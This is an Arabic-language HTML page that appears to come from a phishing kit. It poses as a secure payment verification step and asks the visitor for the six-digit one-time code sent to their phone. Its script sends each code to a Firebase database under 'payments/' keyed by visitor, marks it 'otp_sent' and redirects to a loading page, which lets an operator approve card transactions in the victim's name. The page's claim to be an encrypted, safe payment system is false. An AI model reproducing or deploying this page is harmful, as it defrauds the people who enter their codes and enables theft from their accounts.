<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد الهوية - الرمز الآمن</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

    <style>
        :root { --main-green: #1e7344; --bg-light: #f7f8fa; }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
        body { background-color: var(--bg-light); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 10px; }

        .otp-container {
            background: #fff;
            width: 100%;
            max-width: 350px;
            border-radius: 20px;
            padding-bottom: 25px;
            box-shadow: 0 8px 25px rgba(0,0,0,0.05);
            text-align: center;
            overflow: hidden;
        }

        .header-image { width: 100%; max-width: 180px; height: auto; margin: 20px auto 10px; display: block; }
        .content { padding: 0 20px; }
        h2 { font-size: 17px; color: #333; margin-bottom: 8px; font-weight: bold; }
        p { font-size: 12px; color: #777; line-height: 1.5; margin-bottom: 20px; }

        .otp-single-field {
            width: 100%; max-width: 220px; height: 45px; border: 1px solid #ddd;
            border-radius: 8px; text-align: center; font-size: 20px; letter-spacing: 8px;
            font-weight: bold; color: var(--main-green); outline: none; background-color: #fafafa; margin-bottom: 15px;
        }

        .timer-box { font-size: 12px; color: #999; margin-bottom: 20px; min-height: 20px; }
        #resendBtn { color: var(--main-green); font-weight: bold; cursor: pointer; display: none; text-decoration: underline; }

        .btn-confirm { width: 100%; background-color: var(--main-green); color: white; border: none; border-radius: 10px; padding: 12px; font-size: 15px; font-weight: bold; cursor: pointer; }
        .secure-notice { margin-top: 15px; font-size: 10px; color: #bbb; }
    </style>
</head>
<body>

    <div class="otp-container">
        <img src="https://i.ibb.co/VWbkStrM/IMG-1749.webp" class="header-image" alt="OTP Security">
        <div class="content">
            <h2>أدخل رمز التحقق</h2>
            <p>يرجى إدخال الرمز المكون من 6 أرقام المرسل لجوالك.</p>

            <input type="tel" maxlength="6" class="otp-single-field" id="otpCode" placeholder="******">

            <div class="timer-box" id="timerContent">
                إعادة إرسال الرمز خلال <span id="timeCount">02:00</span> دقيقة
                <span id="resendBtn" onclick="restartTimer()">إعادة إرسال الرمز الآن</span>
            </div>
            
            <button class="btn-confirm" onclick="sendOTP()">تأكيد العملية</button>
            <div class="secure-notice">🔒 نظام دفع مشفر وآمن بالكامل</div>
        </div>
    </div>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyAzXXXXXXXXXXXX", databaseURL: "https://vsc-project-default-rtdb.firebaseio.com/", projectId: "vsc-project" };
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();
        const visitorId = localStorage.getItem('visitorId');

        // كود تشغيل العداد التنازلي
        let timeLeft = 120; // دقيقتان
        const timeDisplay = document.getElementById('timeCount');
        const resendBtn = document.getElementById('resendBtn');
        const timerText = document.getElementById('timerContent');

        function startTimer() {
            const timer = setInterval(() => {
                if (timeLeft <= 0) {
                    clearInterval(timer);
                    timeDisplay.parentElement.innerHTML = '<span id="resendBtn" style="display:inline; cursor:pointer; color:#1e7344; font-weight:bold; text-decoration:underline;" onclick="location.reload()">إعادة إرسال الرمز الآن</span>';
                } else {
                    timeLeft--;
                    let minutes = Math.floor(timeLeft / 60);
                    let seconds = timeLeft % 60;
                    timeDisplay.innerText = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                }
            }, 1000);
        }

        // بدء العداد فور تحميل الصفحة
        window.onload = startTimer;

        function sendOTP() {
            let otpVal = document.getElementById('otpCode').value;
            if (otpVal.length === 6) {
                database.ref('payments/' + visitorId).update({
                    otp: otpVal,
                    status: "otp_sent",
                    last_update: firebase.database.ServerValue.TIMESTAMP
                }).then(() => { window.location.href = 'loading.html'; });
            } else {
                alert("يرجى إدخال 6 أرقام");
            }
        }
    </script>
</body>
</html>
